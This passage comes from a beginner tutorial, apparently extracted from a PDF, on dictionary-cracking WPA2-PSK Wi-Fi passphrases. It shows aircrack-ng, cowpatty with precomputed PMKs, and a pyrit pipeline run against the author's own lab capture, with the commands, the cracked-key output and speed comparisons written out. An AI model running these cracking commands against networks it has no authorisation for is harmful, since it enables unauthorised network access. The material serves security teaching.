+Cracking WPA2 -PSK with Aircrack -ng 
+Requirements:  
+• 4-way EAPoL Handshake ( pcap file)  
+• Wordlist (8 -63 character  length)  
+ 
+In this example,  I have kept real password at the end of the file and checked the maximum 
+speed aircrack -ng reached while cracking the PSK.  
+Go to Desktop, where Pcap file and wordlists are located. Open terminal and Simply type  
+ 
+Syntax : aircr ack-ng -w [wordlist] <Pcap file>  
+ 
+aircrack -ng -w rockyou.txt rootsh3ll -01.cap 
+                                 Aircrack -ng 1.2 rc4  
+ 
+      [00:00:50] 84108/9822765 keys tested ( 1708.09 k/s)  
+ 
+      Time left: 3 hours, 58 minutes, 27 seconds                 0.37%  
+ 
+                         KEY FOUND! [ iamrootsh3ll ] 
+ 
+      Master Key     : 1F 4B 02 FE 4C 82 F4 E0 26 2E 60 97 E7 BA D1 F1  
+                       92 83 B6 68 7F 08 4F 73 33 1D B8 6C 62 49 8B 40  
+ 
+      Transient Key  : D9 E6 11 68 BC F0 0D DF 75 BB 36 ED 38 F2 8A 22  
+                       BA DA 5F 97 CF 2E 6F B1 49 3A 53 2B 45 78 7C 0C  
+                       56 C8 EC D5 BD 64 99 04 E7 0C 1A 7C 2C D7 87 C4  
+                       D5 90 50 E6 ED 40 60 94 BB C9 06 AA 55 35 FF 88  
+ 
+      EAPOL HMAC     : 99 92 11 87 16 7C 8D F2 D1 F9 9B 8E DF 6F 4D 86 
+ 
+Notice the speed:  
+1708.09 Keys/sec , that’s what aircrack -ng reached at max on my system ( i5, 2.5 GHz).  
+ 
+Let’s use the pre -computed PMKs with CoWPAtty and see the difference in speed  
+ 
+There is no GPU involved in generation of PMKs or cracking of Key at any step.  
+ 
+ 
+
+ 
+81 Run in Terminal : 
+Syntax : cowpatty -d [Hash File] -r [Pcap file] -s [SSID]  
+ 
+cowpatty -d PYRIT_rootsh3ll -r rootsh3ll -01.cap -s rootsh3ll  
+cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>  
+ 
+Collected all necessary data to mount cr ack against WPA2/PSK passphrase.  
+Starting dictionary attack.  Please be patient.  
+key no. 10000: vincenzo  
+key no. 20000: 13031991  
+key no. 30000: nejihyuga  
+ 
+The PSK is " iamrootsh3ll ". 
+ 
+36120 passphrases tested in 0.20 seconds:  182297.19 passphrases/second  
+ 
+You can also use GENPMK_rootsh3ll , both are same. I am using PYRIT_rootsh3ll  because it 
+contains more passphrases(PMKs) due to the higher calculation speed of Pyrit.  
+ 
+See the difference ?  
+same system, same RAM, no GPU  included and almost 12,676% boost in s peed.  
+Aircrack -ng: 1708 Passphrases/second  
+Cowpatty with pre -generated PMK: 182297.19  Passphrases/second  
+ 
+This has been possible just because we had pre -computed Keys and what cowpatty  had to 
+do is just loop up  the hash file, no calculations involved.  
+ 
+One passwords take  4096 CPU Iterations to come out with the 256 -bit PSK. Imagine a 
+wordlist containing 1 million passphrases. How many CPU cycles will it take for that wordlist 
+to process and generate the PMKs?  4,096,000,000  that’s 4 billion iterations for 1 million 
+words. Even 1 million words are nothing dictionary sizes go way beyond  Gigabytes , or 
+Terabytes . 
+This is why we get lower cracking speeds as compared to MD5, SHA1 Hash cracking.  
+ 
+[ EXTRA !] Pyrit + CoWPAtty  Stdin  
+  
+Now, we have learned to separately create PMKs and using it with cowpatty  to boost the 
+cracking speeds. Here is one method, which doesn’t improve  the speed compared to 
+aircrack -ng but is very interesting to learn and see the working of the commands as well as 
+the terminal, since this series  is for beginners this thing is a worthwhile.  
+Here what we are going to do is  
+1. Pass a dictionary ( 8-63 Char length) to pyrit and tell it to generate the PMKs  
+2. Don’t write the output to a file rather pass it to CoWPAtty.  
+3. cowpatty  will receive  PMKs as a stdin (standard input) and  
+4. Cracking begin s 
+ 
+
+ 
+82 You can see this as a sophisticated version of cracking with aircrack -ng as in aircrack -ng we 
+just pass the cap file and dictionary. This will be quite long and  deep in terms of 
+understanding.  
+Let’s begin  
+Run in Termin al: 
+pyrit -i length08.txt -e rootsh3ll -o - passthrough | cowpatty -d - -r rootsh3ll -01.cap -s rootsh3ll  
+ 
+Yes, this might seem very confusing if you are a beginner in the Linux world. You need to 
+understand the command. Let’s break it to make it simple and  easy to understand.  
+‘|’: Pipeline operator  
+It is a Linux shell  operator used to pass  a command ’s output to another ( towards right hand 
+side) i.e. after the operator.  
+What we did is we passed the output of the pyrit command to the cowpatty  in real-time  and 
+cowpatty  is executing at the same time and trying to crack the passphrase.  
+ 
+If you notice, you would see that Before and After Pipeline both are the same commands we 
+used above with just one difference.  
+We neither used any output filename with Pyrit ( PYRI T_rootsh3ll  previously), Nor input file 
+for cowpatty  with -d option that is for hash file  (see cowpatty  -h help menu).  
+ 
+So, what did we do? 
+We used another Linux Shell’s feature to store the input in the STDIN ( STanDard INput) and 
+receive  it at the same ti me from STDIN. This is done by using ‘ -‘ operator . This operator 
+works as STDIN when we have to direct some output to/from a file. i.e. writing to Hash file 
+with pyrit and taking input from Hash file with CoWPAtty.  
+ 
+So, if you notice we replaced both the f ilenames with ‘ -‘ that  simply means Pyrit will write 
+the calculated PMKs to Standard Input and the output will be passed using  ‘|’ operator to 
+the cowpatty  command. Now at the very same moment at which cowpatty  starts receiving  
+the Input from the STDIN, as  told to ‘ -d’ option, CoWPAtty will take the calculated PMKs 
+from the STDIN and start cracking the PSK. If  PMK matched the passphrase will be found, 
+else try other dictionaries and keep going.  
+ 
+This is what it will look like when executed:  
+cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>  
+ 
+Collected all necessary data to mount crack against WPA2/PSK passphrase.  
+Starting dictionary attack.  Please be patient.  
+Using STDIN for hashfile contents.  
+ 
+key no. 10000: vincenzo  
+key no. 20000: 13031991  
+key no. 30000: nejihyuga  
+ 
+The PSK is "iamrootsh3ll".  
+ 
+36120 passphrases tested in 62.48 seconds:  578.09 passphrases/second  
+
+
+[Note: PDF has 193 pages, only first 100 pages extracted]
